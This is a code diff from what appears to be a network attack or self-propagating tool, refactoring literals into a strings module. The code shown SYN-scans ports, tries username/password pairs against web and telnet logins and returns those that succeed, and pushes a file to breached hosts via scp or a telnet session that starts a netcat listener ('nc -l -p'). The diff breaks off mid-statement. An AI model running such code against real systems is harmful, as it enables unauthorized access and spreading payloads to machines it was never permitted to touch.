@@ -519,7 +519,7 @@ def remove_unreachable_ips(ip_list):
     """
     new_ip_list = []
     for ip in ip_list:
-        print("Checking if the following ip address is reachable: " + str(ip))
+        logging.info(strings.checking_ip_reachable(ip))
         if is_reachable_ip(ip):
             new_ip_list.append(ip)
     return new_ip_list
@@ -535,7 +535,7 @@ def scan_port(ip, port):
     :return False: The port is not open
     """
     ip_header = IP(dst=ip)
-    tcp_header = TCP(dport=int(port), flags="S")
+    tcp_header = TCP(dport=int(port), flags=strings.SYN_FLAG)
     packet = ip_header / tcp_header
     response, unanswered = sr(packet, timeout=2)
     sleep(2)
@@ -555,15 +555,17 @@ def send_post_request_with_login(ip, port, username, password):
     :param username: The username for the web login
     :param password: The password for the web login
     """
-    response = requests.post("https://" + ip + ":" + port + "/login.php",
-                             data={"username": username, "password": password},
+    response = requests.post(strings.web_login_url(ip, port),
+                             data={strings.USERNAME_PROMPT_WEB: username,
+                                   strings.PASSWORD_PROMPT_WEB: password},
                              timeout=4)
     if response:
-        logging.info(strings.connection_status("web", ip, port, "Successful"))
-        return str(username) + ":" + str(password)
+        logging.info(strings.connection_status(strings.WEB, ip, port,
+                                               strings.SUCCESSFUL))
+        return str(username) + strings.COLON + str(password)
     else:
-        logging.debug(strings.connection_status("web", ip, port,
-                                                "Unsuccessful"))
+        logging.debug(strings.connection_status(strings.WEB, ip, port,
+                                                strings.UNSUCCESSFUL))
         return None
 
 
@@ -580,7 +582,7 @@ def telnet_connection(ip, port, username, password):
     :return None: If the telnet connection is unsuccessful
     """
     if connect_telnet(ip, port, username, password):
-        return str(username) + ":" + str(password)
+        return str(username) + strings.COLON + str(password)
     return None
 
 
@@ -598,19 +600,18 @@ def transfer_file(ip, port, login_string, transfer_file_filename):
     :return True: The transfer of the file is a success
     :return False: The transfer of the file is unsuccessful
     """
-    login_string_split = login_string.split(":")
+    login_string_split = login_string.split(strings.COLON)
     try:
-        if str(port) == "22":
-            print(
-                "Please type in this password below and say yes to any RSA key"
-                + " prompts: ")
-            os.system("scp -P " + str(port) + " " + transfer_file_filename
-                      + " " + login_string_split[0] + "@" + ip + ":~/")
+        if str(port) == strings.SSH_PORT:
+            print(strings.RSA_AND_PASSWORD)
+            os.system(strings.scp_command_string(port, login_string_split[0],
+                                                 ip, transfer_file_filename))
             return True
 
         tel = Telnet(host=ip, port=port, timeout=2)
-        tel.read_until("login:".encode("ascii"))
-        tel.write((str(login_string_split[0]) + "\n").encode("ascii"))
+        tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
+        tel.write((str(login_string_split[0]) +
+                   strings.RETURN_OR_NEWLINE).encode(strings.ENCODE_ASCII))
         tel.read_until("Password:".encode("ascii"))
         tel.write((str(login_string_split[1]) + "\n").encode("ascii"))
         tel.write(("nc -l -p " + str(port) + " > "
